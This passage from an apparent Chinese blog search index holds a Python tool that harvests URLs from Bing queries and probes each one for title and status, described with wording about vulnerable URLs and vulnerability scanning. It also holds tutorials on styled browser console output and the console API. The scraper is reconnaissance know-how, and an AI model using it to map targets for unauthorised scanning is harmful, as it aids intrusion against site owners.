(KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', #模拟浏览器请求 'Connection':'close', 'Accept-Encoding':'gzip, deflate' } count=1 #全局变量 用于序号字段 queueLock = threading.Lock() #全局变量 使用线程锁处理 线程异常问题 class DoRun(threading.Thread): #自定义 多线程运行时使用的类 方法： def get_Input(): #获取search语句 和 page def getUrls(search,page): #构造搜索语句，在bing搜索引擎搜索数据并返回urls def req(url): #对url进行验证，返回numb,url,title,status def init_excel(filename): #创建.xlsx表格，并初始化内容 def Save_Date(date,filename): #将数据存储到表格当中 def run(): #核心代码 完整代码如下： #coding:utf-8 import requests #发起request请求 import urllib3 #处理请求https异常报错问题 import re #使用正则表达式对请求到的数据进行处理 from optparse import OptionParser #自定义输入参数 import threading #多线程模块 import queue #多线程辅助模块，使用队列的方式对多线程进行控制 from bs4 import BeautifulSoup #与re类似 使用正则表达式对请求到的数据进行处理 import time,datetime #获取当前的时间 from openpyxl import * #数据处理，将获取到的数据保存在excel文件中 heads = { #全局变量 请求头 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', #模拟浏览器请求 'Connection':'close', 'Accept-Encoding':'gzip, deflate' } count=1 #全局变量 用于序号字段 queueLock = threading.Lock() #全局变量 使用线程锁处理 线程异常问题 class DoRun(threading.Thread): #自定义 多线程运行时使用的类 def __init__(self,queue,filename): threading.Thread.__init__(self) self._queue=queue self._filename=filename def run(self): while not self._queue.empty(): js=req(self._queue.get()) #print(js) queueLock.acquire() if(js): Save_Date(js,self._filename) queueLock.release() def init_excel(filename): #创建.xlsx表格，并初始化内容 wb=Workbook() filename=filename+\".xlsx\" ws=wb.create_sheet(index=0,title=\"域名\") head=['序号','域名','标题','状态'] for i in range(0,4): ws.cell(1,i+1).value=head[i] wb.save(filename) def Save_Date(date,filename): #将数据存储到表格当中 filename=filename+\".xlsx\" wb_save=load_workbook(filename) ws_save=wb_save.worksheets[0] current_row=ws_save.max_row+1 current_col=1 for key in date: ws_save.cell(date['numb']+1,current_col).value=str(date[key]) current_col+=1 wb_save.save(filename) def req(url): #对域名进行验证，返回状态码，title global count dir={'numb':0,'url':'url','title':'None','status':0} stat=0 title=\"None\" try: urllib3.disable_warnings() response = requests.get(url=url,headers=heads,verify=False,timeout=10) #请求漏洞的url if response.status_code == 200: bs=BeautifulSoup(response.content,\"html.parser\") title=bs.find(\"title\").text stat=response.status_code dir['numb']=count dir['url']=url dir['title']=title dir['status']=stat count+=1 print(\"[+]\"+url+\"\\ttitle:\"+title) return dir else: print('[-]请求失败：\\t{}\\t{}'.format(url,response.status_code)) except Exception as e: print('[-]请求失败: {}\\t'.format(e,url)) def getUrls(search,page): #构造搜索语句，在bing搜索引擎 搜索数据并返回urls count=1 urls=[] url=\"https://cn.bing.com/search?q={}\u0026first={}\" for i in range(1,page): if(i!=1): count=(i-2)*10+9 url=url.format(search,i) try: resp=requests.get(url=url,headers=heads) html=resp.text if(resp.status_code==200): res=re.findall(r'\u003ca target=\"_blank\" href=\"(.*?)\"',html) for u in res: if(u not in urls): urls.append(u) else: print('[-]请求失败：\\t{}\\t{}'.format(url,resp.status_code)) except Exception as e: print('[-]请求失败: {}\\t'.format(e,url)) return urls def get_Input(): #获取search语句 和 page optParser = OptionParser() optParser.add_option('-s','--search',action = 'store',type = \"string\" ,dest = 'search',help='漏扫文件的目录'","date":"2021-11-13","objectID":"/zh-cn/13/:0:0","tags":["编程","代码","Python"],"title":"使用Python打造自己的信息收集工具","uri":"/zh-cn/13/"},{"categories":["浏览器","Web","命令行","JavaScript"],"content":"浏览器 console 彩蛋的原理与实现 打开浏览器的开发者模式的控制台，比如 F12（或者 shift + command + j）打开Chrome 的控制台，有些网站会在这里面展示一些信息，比如招聘信息。话不多说，先上一波演示。 ","date":"2021-11-12","objectID":"/zh-cn/12/:0:0","tags":["浏览器","Web","命令行","JavaScript"],"title":"浏览器 console 彩蛋的原理与实现","uri":"/zh-cn/12/"},{"categories":["浏览器","Web","命令行","JavaScript"],"content":"演示 文字类型： 1、天猫 2、百度 3、更炫酷的 字符画类型： 4、知乎 5、hrwhisper 图片类型： 6、凹凸实验室 ","date":"2021-11-12","objectID":"/zh-cn/12/:0:1","tags":["浏览器","Web","命令行","JavaScript"],"title":"浏览器 console 彩蛋的原理与实现","uri":"/zh-cn/12/"},{"categories":["浏览器","Web","命令行","JavaScript"],"content":"实现 看完效果。我们一起学习一下，这些炫酷效果怎么实现的。 console.log('%c', 'CSS代码'); ","date":"2021-11-12","objectID":"/zh-cn/12/:0:2","tags":["浏览器","Web","命令行","JavaScript"],"title":"浏览器 console 彩蛋的原理与实现","uri":"/zh-cn/12/"},{"categories":["浏览器","Web","命令行","JavaScript"],"content":"文字实现： console.log('%c 你好！', 'background: #008000; color: #fff'); ","date":"2021-11-12","objectID":"/zh-cn/12/:0:3","tags":["浏览器","Web","命令行","JavaScript"],"title":"浏览器 console 彩蛋的原理与实现","uri":"/zh-cn/12/"},{"categories":["浏览器","Web","命令行","JavaScript"],"content":"图片实现： console.log('%c ','background:url(http://7oxgmt.com1.z0.glb.clouddn.com/wp-content/themes/VicSugar-wordpress/public/img/face.jpg) no-repeat left center;font-size:200px'); 注：width、height 这几个属性是不支持的，只能用 font-szie 来设置图片高宽。 ","date":"2021-11-12","objectID":"/zh-cn/12/:0:4","tags":["浏览器","Web","命令行","JavaScript"],"title":"浏览器 console 彩蛋的原理与实现","uri":"/zh-cn/12/"},{"categories":["浏览器","Web","命令行","JavaScript"],"content":"字符画： 上面的字符画效果是怎么实现的那？哈哈，肯定不是手打的啦。介绍两款很方便的软件，上传图片，可以自动生成对应的字符画。 字符画生成器 http://www.degraeve.com/img2txt.php http://picascii.com/ 字符画直接复制到 console.log 中会报错，处理方式： 1、ES6 里可以使用 ` `` 符号处理多行字符串。 2、把字符画复制到 Sublime Text 里，全选 然后 shift + ctrl + l 多行光标 在每行的开头添加 \\n ，然后删除换行，使多行字符串变成单行字符串。 ","date":"2021-11-12","objectID":"/zh-cn/12/:0:5","tags":["浏览器","Web","命令行","JavaScript"],"title":"浏览器 console 彩蛋的原理与实现","uri":"/zh-cn/12/"},{"categories":["浏览器","Web","命令行","JavaScript"],"content":"实践 在当前页面，打开浏览器的控制台，就可以看到我博客设置的 console 信息了。 代码实现： var consoleConfig = { welcome: '\\n欢迎访问 https://hufangyun.com ，围观我的博客(づ｡◕‿‿◕｡)づ！\\n', theme: '\\n本博客使用 %cHexo%c 搭建，博客主题为本人开发的 %chexo-themes-yearn%c ~~~ 🎉🎉🎉 \\n\\n源码 https://github.com/Youthink/hexo-themes-yearn \\n\\n如果喜欢可以 star 支持一下 ❤️~\\n', qrcode: '\\n扫描下面的二维码，在手机上查看博客！\\n', search: '\\n想知道这个效果如何实现的？博客内搜索 console 彩蛋！\\n' }; var consoleInfo = (function(consoleConfig) { console.log('%c' + consoleConfig.welcome, 'color: #6190e8'); console.log('%c' + consoleConfig.theme, 'color: #6190e8;','padding: 0 5px;color: #fff;background: #6190e8;','color: #6190e8;','padding: 0 5px;color: #fff;background: #6190e8;','color: #6190e8;'); console.log('%c' + consoleConfig.qrcode, 'color: #6190e8'); console.log('%c' + consoleConfig.search, 'color: #6190e8'); console.log('%c ', 'background: url(https://static.hufangyun.com/blog-url-qrcode-180-180.png) no-repeat left center;font-size: 180px;'); }(consoleConfig)); ","date":"2021-11-12","objectID":"/zh-cn/12/:0:6","tags":["浏览器","Web","命令行","JavaScript"],"title":"浏览器 console 彩蛋的原理与实现","uri":"/zh-cn/12/"},{"categories":["浏览器","Web","命令行","JavaScript"],"content":"参考链接 让console充满情怀 autoplay=“true” loop=“true”\u003e}} ","date":"2021-11-12","objectID":"/zh-cn/12/:1:0","tags":["浏览器","Web","命令行","JavaScript"],"title":"浏览器 console 彩蛋的原理与实现","uri":"/zh-cn/12/"},{"categories":["浏览器","Web","命令行","JavaScript"],"content":"javascript Console控制台调试开发 1.经常使用的Console系列函数有: console.log()，console.info()，console.debug(),console.warn()，console.error()，对应着某些要输出内容的级别，至关于log日志同样。 特色： ①其实这些方法的实现中，参数由arguments获取，所以能够传递1个或者多个参数, 如 console.log({age:20}); console.log(1,2,4); ②参数的第一个参数能够是格式化占位符，console.log(\" %s + %s = %s\", 2, 2, 2)，或者 console.log(\" %s + %s = \", 1, 1, 2) 2.这里列出全部可能的占位符 %d, %i 整数 %f 浮点数 %o 对象的连接 %c CSS格式字符串 %s 字符串 首先来看2个例子，都是google开发者工具（猛摁电脑功能键F12）,在控制台的输出python facebook json baidu 数组 3.代码分析 咱们如今只看百度的源代码就好了ruby 这是图片的函数 if(window.console){var c=console,r=t(\"#search-box .logo\");c\u0026\u0026r.size()\u0026\u0026(c.log(\"\\n\\n%c\",\"font-size:0;line-height:50px;padding-top:\"+r.height()+\"px; padding-left:\"+r.width()+\"px;background:\"+r.css(\"background\")+\";background-repeat:no-repeat;\") 文字的就不粘贴了，基本全是 utf-8转义字符工具 额，貌似不够流畅，转换一下吧 if (window.console) { var cons = console; if (cons) { cons.log(\"%c\\n\\t \", \"font-size:41px;background:url('http://cdn.iknow.bdimg.com/static/common/pkg/module_zed9cd9fd.png') no-repeat -135px -1px\"); cons.log('想和咱们共同打造世界最大中文互动问答平台吗？\\n想让本身的成就在亿万用户面前展示吗？想让世界看得你的光芒吗？\\n加入咱们，在这里不只是工做，投入你的时间和热情，滴滴汗水终会汇聚成不平凡的成果。\\n期待你的加盟。www.baidu.com'); cons.log(\"请在邮件中注明%c来自:console\", \"color:red;font-weight:bold;\"); } } ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 4.使用console.table输出表格 var user = [ { name: \"zhangsan\", age: 20,id:1024 }, { name: \"lisi\", age: 22,id:1023 }, { name: \"wangwu\", age: 23,id:1025 }, ]; console.log(user); 5.console.dir(object) 打印对象信息，类PHP中的var_dump函数和python中的dir函数 var user = [ { name: \"zhangsan\", age: 20,id:1024 }, { name: \"lisi\", age: 22,id:1023 }, { name: \"wangwu\", age: 23,id:1025 }, ]; var strUser = JSON.stringify(user); console.dir(user); console.dir(strUser); 6.断言console.assert()，相似java中的断言 7,console.time(tag)，console.timeEnd(tag)耗时计算 var tag = 'task name'; console.time(tag); for(var i=1;i\u003c=9;i++) { for(var j=1;j\u003c=i;j++) { console.log(document.createTextNode(j+'*'+i+'='+(i*j))) } } console.timeEnd(tag) 8.console.clear()清除控制台 9.console.trace()打印代码调用的堆栈信息 10.console.dirxml(obj) 11.设定断点 for(var i = 0;i\u003c5;i++){ console.log(i); if (i===2) debugger; } 12.性能测试 13.控制台命令（非javascript命令） $_属性返回上一个表达式的值。 $$(selector)返回一个选中的DOM对象，等同于document.querySelectorAll。 $x(path)方法返回一个数组，包含匹配特定XPath表达式的全部DOM元素。 keys(object)方法返回一个数组，包含特定对象的全部键名。 values(object)方法返回一个数组，包含特定对象的全部键值。 inspect(object)方法打开相关面板，并选中相应的元素：DOM元素在Elements面板中显示，JavaScript对象在Profiles中显示 getEventListeners(object)方法返回一个对象，该对象的成员为登记了回调函数的各类事件（好比click或keydown），每一个事件对应一个数组，数组的成员为该事件的回调函数。 monitorEvents(object[, events]) ，unmonitorEvents(object[, events]) monitorEvents(object[, events])方法监听特定对象上发生的特定事件。当这种状况发生时，会返回一个Event对象，包含该事件的相关信息。unmonitorEvents方法用于中止监听。 14.js合并压缩 Google Closure是Google提供的一个JavaScript源码处理工具，主要用于压缩和合并多个JavaScript脚本文件。 java -jar /path/to/closure/compiler.jar –js script1.js –js script2.js –js script3.js 使用console.log在控制台打印图片 在项目的开发中我们经常使用console.log方法在控制台输出数据，看数据是否正确。console是全局变量window（或global）下的一个对象，它给我们提供了很多的方法，我们可以打印一下这个对象，如下： 我们可以看到除了log方法以外还有info、warn、error等方法，类似于常用的日志系统中的不同级别。 console.log(\"log\"); console.info(\"info\"); console.warn(\"warn\"); console.error(\"error\"); 显示出来的效果在Chrome里面的效果如下: 其中log和info的区别有点不太明显，我们在Firefox下再次打印可以看到info级别的左边有个图标: 除了这几个不同级别的打印外，还有一个使用的比较多方法就是console.table，它可以用表格列出一个对象的属性： 最后再简绍一个可以清空控制台的一个方法就是console.clear()，其他的方法大家可以自己试试，还是挺有意思的。 说了这么多我们回归到最常用的console.log()吧，他可以打印一些数据，但是很多人不知道其实它还可以添加占位符，类似于C语言的printf函数，具体可以使用的占位符如下： 占位符 作用 %s 字符串 %d 或者 %i 整数 %f 浮点数 %o 可展开的DOM %O 列出DOM的属性 %c 根据提供的css样式格式化字符串 我们试一下前三个： console.log(\"打印的字符串是：%s\",\"JavaScript很简单\"); console.log(\"打印的整数是：%d\",123.456); console.log(\"打印的浮点数是：%f\",123.456); 结果如下： console.log(\"%o\",document.body);的结果大致如下： console.log(\"%O\",document.body);的结果大致如下： 所有占位符中最牛逼的当然是%c了，因为他可以添加样式，这样就可以美化我们的打印效果了。先来看个例子： console.log(\"%c神奇的console\",\"font-size: 24px;font-style: italic;color: brown;\"); 结果如下： 最后我们回归主题，打印一张图片，思路就是使用background-image来添加一张背景图片。这里需要要注意的是，设置背景以后要有内容，不然还是不会显示（当然也可以添加样式让内容撑开，大家可以试试）。我们这里随便写个内容就比如一个“+”，当然我们还要设置背景图片显示大小，并且让内容透明（不显示内容）。为了方便代码的阅读，样式部分我使用了ES6的模板字符串，具体代码如下： console.log(\"%c+\", `","date":"2021-11-11","objectID":"/zh-cn/11/:0:0","tags":["浏览器","Web","命令行","JavaScript"],"title":"javascript Console控制台调试开发","uri":"/zh-cn/11/"},{"categories":["浏览器","Web","命令行","JavaScript"],"content":"使用 CSS 设置控制台输出的样式 利用 CSS 格式说明符，您可以自定义控制台中的显示。使用说明符启动字符串，并设置为您希望的样式，作为第二个参数。 尝试使用下面的代码： console.log(\"%cThis will be formatted with large, blue text\", \"color: blue; font-size: x-large\"); ..将您的日志输出设置为蓝色的大字体： 是不是有点炫酷，下面还有更炫酷的。 \\1. 输出 3D 文本 console.log(\"%c发送简历到 keminok@qq.com\",\" text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);font-size:5em\") 效果如下： 2.输出多彩背景 console.log(\"%cColorful CSS\",“background: rgba(252,234,187,1);background: -moz-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%,rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -webkit-gradient(left top, right top, color-stop(0%, rgba(252,234,187,1)), color-stop(12%, rgba(175,250,77,1)), color-stop(28%, rgba(0,247,49,1)), color-stop(39%, rgba(0,210,247,1)), color-stop(51%, rgba(0,189,247,1)), color-stop(64%, rgba(133,108,217,1)), color-stop(78%, rgba(177,0,247,1)), color-stop(87%, rgba(247,0,189,1)), color-stop(100%, rgba(245,22,52,1)));background: -webkit-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -o-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -ms-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: linear-gradient(to right, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#fceabb', endColorstr='#f51634', GradientType=1 );font-size:5em”) 当然，你也可以输出更多好玩的文本样式，这里就需要读者朋友自己好好探索了，尚未测试代码对浏览器的兼容性，请在发布到生产环境之前进行检查，本文旨在提供一个简单的前端代码学习思路，愿君多采撷。 参考资料： https://www.w3cplus.com/css3/text-effect https://www.cnblogs.com/Wayou/p/chrome_dev_tool_style_console.html https://developers.google.com/web/tools/chrome-devtools/console/console-write ","date":"2021-11-11","objectID":"/zh-cn/11/:0:1","tags":["浏览器","Web","命令行","JavaScript"],"title":"javascript Console控制台调试开发","uri":"/zh-cn/11/"},{"categories":["浏览器","Web","命令行"],"content":"控制台命令调试时经过浏览器开发工具中的控制台命令嵌入到JavaScript中，输出特定的信息或日志，从而达到调试的目的。html 咱们经常使用的Chrome和FireFox，均可以经过F12来打开开发工具。node 下面简要介绍几个经常使用的控制台命令：浏览器 （1）常规信息输出函数 console.log()是咱们最经常使用的命令，只须要将咱们但愿输出的内容传进入便可：工具 console.log(\"这是我要输出的信息\"); 除了console.log()命令外，咱们还有其它三种命令：开发工具 console.info(\"这是我要输出的信息\"); console.error(\"错误信息\"); console.warn(\"警告信息\"); 从这四种命令的名称就能够看出来它们的做用，它们是用来展现不一样类型信息，使得咱们的信息输出更加规范（我的观点）。spa （2）常规信息分组输出调试 大量的信息输出，咱们可使用分组输出来对它们进行分组，方便咱们查看：日志 console.group(\"第一组开始\"); console.log(\"第一组第一条\"); console.log(\"第一组第二条\"); console.groupEnd(); console.group(\"第二组开始\"); console.log(\"第二组第一条\"); console.log(\"第二组第二条\"); console.groupEnd(); console.group()命令用于分组的开始，console.groupEnd()用来结束分组。code （3）对象输出 console.dir()是专门输出对象全部方法和属性的，咱们就能够不用本身遍历就查看对象的信息： var obj = { name: \"haha\", desc: \"doubi\" }; console.dir(obj); （4）DOM输出 console.dirxml()命令是专门输出某个节点（node）所包含的html/xml代码： var div = document.getElementById(\"demo\"); console.dirxml(div); 因为内容过多，图片并无截全。 （5）函数调用轨迹监测 var x = test3(1); function test(a) { console.trace(); return a; } function test1(a) { return test(a); } function test2(a) { return test1(a); } function test3(a) { return test2(a); } （6）计时功能 有时咱们须要监测一段代码花费的时间，咱们一般能够这样作： var time1 = new Date(); for (var i = 0; i \u003c 100; i++) { } var time2 = new Date(); console.log(time2 - time1); 咱们还能够经过console.time()和console.timeEnd()帮助咱们完成这件事： console.time(\"计时器\"); for (var i = 0; i \u003c 100; i++) { } console.timeEnd(\"计时器\"); 须要注意的是，这两个命令里面的参数要一致，才会输出计时信息。 好了，在下了解的console经常使用命令就这些啦，若是有遗漏的console相关的其它经常使用命令，也欢迎你们来补充哦。 Console - 提供了对浏览器调试控制台的访问 Console 对象提供了对浏览器调试控制台的访问（例如 Firefox 中的 Web 控制台）。其工作原理的具体细节因浏览器而异，但通常会提供_事实上_的一组功能。 可以从任何全局对象访问 Console 对象。如 Window，WorkerGlobalScope 以及通过属性工作台提供的特殊定义。它定义为 Window.console，可以简单地通过 console 来引用。例如 console.log(\"无法打开指定的链接\") 该页面记录了 Console 对象上可用的方法，并提供了一些用法示例。 注意： 此特性在 Web Worker 中可用。 ","date":"2021-11-10","objectID":"/zh-cn/10/:0:0","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"方法 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:0","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.assert() 如果第一个参数是 false，则将消息和堆栈跟踪记录到控制台。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:1","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.clear() 清空控制台。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:2","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.count() 输出给定的标签，调用该行的次数。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:3","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.debug() 使用日志级别 \"debug\" 向控制台输出消息。 注意： 从 Chromium 58 开始，当选择级别为 “Verbose” 时，该方法的输出才在 Chromium 浏览器控制台中显示。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:4","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.dir() 显示指定 JavaScript 对象的属性的交互式列表。该列表允许您使用显示三角形来检查子对象的内容。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:5","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.dirxml() 如果可能，显示指定对象的 XML/HTML 元素表示，如果不可能，则显示 JavaScript 对象视图。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:6","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.error() 打印一条 error 级别的信息。您可以使用字符串替换作为该方法的额外参数。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:7","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.exception() error() 的别名。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:8","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.group() 创建一个新的内联组，将所有后续输出缩进另一个级别。要退出一个级别，请调用 groupEnd() 。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:9","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.groupCollapsed() 创建一个新的内联组，将所有后续输出缩进另一个级别。然而，与 group() 不同，改内联组是默认折叠的，需要点击来展开它。要退出一个级别，请调用 groupEnd() 。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:10","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.groupEnd() 退出当前的内联组。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:11","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.info() 打印一条 info 级别的信息。您可以使用字符串替换作为该方法的额外参数。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:12","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.log() 用于记录信息的一般输出。您可以使用字符串替换作为该方法的额外参数。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:13","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.profile() 启动浏览器的内置分析器（例如，Firefox 性能工具）。您可以为分析的文件指定名称。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:14","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.profileEnd() 停止分析器。您可以在浏览器的性能工具中查看生成的分析文件（例如，Firefox 性能工具）。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:15","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.table() 将表格数据显示为表格。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:16","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.time() 使用指定的名称启动 timer。在给定页面上最多可以运行 10,000 个同步计时器。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:17","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.timeEnd() 停止指定的 timer 并记录自启动以来经过的时间（以秒为单位）。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:18","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.timeStamp() 在浏览器的 时间轴 或 Waterfall 工具中添加标记。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:19","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.trace() 输出堆栈跟踪。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:20","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"Console.warn() 打印一条 warn 级别的信息。您可以使用字符串替换作为该方法的额外参数。 ","date":"2021-11-10","objectID":"/zh-cn/10/:1:21","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"用法 ","date":"2021-11-10","objectID":"/zh-cn/10/:2:0","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"将文本输出到控制台 控制台最常用的功能是记录文本和其他数据。您可以分别使用 console.log()，console.info()，console.warn() 和 console.error() 方法生成四种类型的输出。这些结果中的每一个都会导致输出在日志中的样式不同，您可以使用浏览器提供的过滤控件来仅查看您感兴趣的输出类型。 每种输入方式有两种方法可以调用；你可以简单地传入一个对象列表，这些对象的字符串表示被连接成一个字符串，然后输出到控制台，或者你可以传入一个包含零个或多个替换字符串的字符串，后跟一个对象列表来替换它们。 输出单个对象 使用日志记录方法的最简单方法是输出单个对象： var someObject = { str: \"Some text\", id: 5 }; console.log(someObject); 输出看起来像这样： [09:27:13.475] ({str:\"Some text\", id:5}) 输出多个对象 您还可以在调用日志记录方法时通过简单地列出它们来输出多个对象，如下所示： var car = \"Dodge Charger\"; var someObject = { str: \"Some text\", id: 5 }; console.info(\"My first car was a\", car, \". The object is:\", someObject); 输出看起来像这样： [09:28:22.711] My first car was a Dodge Charger . The object is: ({str:\"Some text\", id:5}) 字符串替换 Gecko 9.0 (Firefox 9.0 / Thunderbird 9.0 / SeaMonkey 2.6) 引入了对字符串替换的支持。将字符串传递给接受字符串的控制台对象的方法之一时，您可以使用这些替换字符串： 替换字符串 描述 %o 或 %O 输出 JavaScript 对象。单击对象名称可在检查器中展开有关它的更多信息。 %d 或 %i 输出一个整数。支持数字格式，例如 console.log(\"Foo %.2d\", 1.1) 将输出数字作为两个有效数字，前导 0：Foo 01 %s 输出一个字符串。 %f 输出浮点值。支持格式化，例如 console.log(\"Foo %.2f\", 1.1) 将数字输出到 2 位小数：Foo 1.10 注意： Chrome 中不支持精确格式化 每个都在格式字符串离开参数列表后拉出下一个参数。例如： Each of these pulls the next argument after the format string off the parameter list. For example: for (var i=0; i\u003c5; i++) { console.log(\"Hello, %s. You've called me %d times.\", \"Bob\", i+1); } 输出看起来像这样： [13:14:13.481] Hello, Bob. You've called me 1 times. [13:14:13.483] Hello, Bob. You've called me 2 times. [13:14:13.485] Hello, Bob. You've called me 3 times. [13:14:13.487] Hello, Bob. You've called me 4 times. [13:14:13.488] Hello, Bob. You've called me 5 times. 给控制台输出加样式 您可以使用 %c 指令将 CSS 样式应用于控制台输出： console.log(\"This is %cMy stylish message\", \"color: yellow; font-style: italic; background-color: blue;padding: 2px\"); 指令前的文本不会受到影响，但指令后面的文本将使用参数中的 CSS 声明设置样式。 注意： 这种方法支持相当多的 CSS 属性；你应该试验一下，看看哪些是有效的。 ","date":"2021-11-10","objectID":"/zh-cn/10/:2:1","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"在控制台中使用组 Requires Gecko 9.0(Firefox 9.0 / Thunderbird 9.0 / SeaMonkey 2.6) 您可以使用嵌套组通过直观地组合相关材料来帮助组织输出。要创建一个新的嵌套块，请调用 console.group() 。 console.groupCollapsed() 方法也类似，但创建的是折叠的块，需要点击按钮来展开它。 注意： Gecko 尚不支持折叠组；目前 groupCollapsed() 方法与 group() 效果相同。 要退出当前组，只需调用 console.groupEnd() 。例如，给定该代码： console.log(\"This is the outer level\"); 